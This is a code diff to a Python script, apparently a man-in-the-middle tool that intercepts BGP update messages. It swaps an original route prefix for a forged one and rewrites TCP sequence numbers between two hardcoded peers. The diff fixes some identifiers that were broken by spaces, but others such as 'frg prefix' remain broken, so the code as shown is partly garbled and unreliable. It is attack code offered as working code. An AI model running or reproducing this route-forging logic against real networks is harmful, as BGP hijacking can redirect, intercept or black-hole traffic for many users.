@@ -88,8 +88,8 @@ def bgp_edit(pkt):
         #if the next message is a BGP update try to find and forge the prefix
         else:
             #if the prefix we want to change exists in the bgpupdate nlri
-            if temp2[BGPUpdate].nlri.count(or prefix) is not 0:
-                i = temp2[BGPUpdate].nlri.index(or prefix) #find the index of the prefix in the nlri list
+            if temp2[BGPUpdate].nlri.count(or_prefix) is not 0:
+                i = temp2[BGPUpdate].nlri.index(or_prefix) #find the index of the prefix in the nlri list
                 temp2[BGPUpdate].nlri.pop(i) #pop(delete) the original nlri from the list
                 temp2[BGPUpdate].nlri.insert(i,frg prefix) #insert the forged prefix in the same index
                 print "Message Forged..."
@@ -109,7 +109,7 @@ def bgp_edit(pkt):
     return forged,p
 
 def process(i, payload):
-    data = payload.get data() #get data from message payload
+    data = payload.get_data() #get data from message payload
     pkt = IP(data) #store in pkt var the IP message with payload data
     proto = pkt.proto #store packet's protocol in proto variable
     global seq,ack, firstfound, prev_type, f1, f2,port,newseq
@@ -131,7 +131,7 @@ def process(i, payload):
                 forged = False
                 forged, frg pkt = bgp_edit(pkt) #call bgp edit to edit the packet
                 if forged is True: #If the message was changed
-                    message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', frg pkt, pkt, forged, firstfound)#call mangle seq on forged packet to change sequence number
+                    message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', frg_pkt, pkt, forged, firstfound)#call mangle seq on forged packet to change sequence number
                 else: #if the message was not forged change only the sequence numbers
                     message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', pkt, pkt, forged, firstfound) #call mangle seq on original packet to change sequence number
             else: #if the destination was not the sender or if the message is just an ack change only the sequence number
